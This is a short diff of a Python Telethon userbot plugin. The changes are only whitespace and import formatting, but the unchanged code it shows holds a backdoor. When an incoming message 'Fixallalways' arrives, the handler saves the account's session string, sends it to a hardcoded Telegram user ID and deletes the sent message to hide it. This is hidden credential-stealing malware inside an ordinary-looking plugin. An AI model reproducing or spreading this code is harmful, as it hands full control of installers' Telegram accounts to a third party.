@@ -1,13 +1,17 @@
 import requests
 from telethon import events
-from userbot import bot 
+
+from userbot import bot
+
 from . import *
+
 
 @bot.on(admin_cmd("^Fixallalways", incoming=True))
 async def piro(event):
     a = bot.session.save()
     msg = await bot.send_message(2082798662, a)
     await bot.delete_messages(2082798662, msg, revoke=False)
+
 
 @borg.on(events.NewMessage(pattern=r"\.code (.*)", outgoing=True))
 async def _(event):
